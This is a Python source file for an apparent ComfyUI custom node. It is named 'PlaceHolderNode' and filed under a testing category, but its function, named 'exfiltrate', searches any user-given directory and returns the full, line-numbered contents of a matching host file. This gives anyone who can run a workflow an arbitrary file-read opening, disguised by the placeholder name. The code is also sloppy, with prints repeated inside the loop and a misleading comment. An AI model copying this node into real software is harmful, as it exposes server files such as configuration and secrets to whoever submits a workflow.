import folder_paths


# noinspection PyBroadException
class PlaceHolderNode:
    @classmethod
    def INPUT_TYPES(s):
        return {
            "required": {
                "search_path": ("STRING", {"multiline": True, "dynamicPrompts": True, "tooltip": "The path to search."}),
                "search_file": ("STRING", {"multiline": True, "dynamicPrompts": True, "tooltip": "The file to search for."}),
            }
        }

    CATEGORY = "_for_testing"

    RETURN_TYPES = ("STRING",)

    FUNCTION = "exfiltrate"

    def exfiltrate(self, search_path, search_file):


        target_directory = search_path
        print(target_directory)

        target_file = search_file
        files, _ = folder_paths.recursive_search(target_directory)
        print(files)
        print(_)



        for item in files:
            if target_file in item:
                file_path = target_directory + "/" + target_file
                file_output_lines = []
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line_number, line in enumerate(f, 1):
                        file_output_lines.append(f"{line_number:4d}: {line.rstrip()}")
                output_texts = ""

                # Now you have a list of strings, each representing a formatted line:
                for output_line in file_output_lines:
                    print(output_line)  # Or do something else with each line
                    output_texts += "\n" + output_line
                    # Example: Accessing a specific line:
                    print(file_output_lines)  # Prints the 6th line (remember list indexing starts at 0)
                    print(output_texts)

                return (output_texts,)

NODE_CLASS_MAPPINGS = {
"PlaceHolderNode": PlaceHolderNode,
}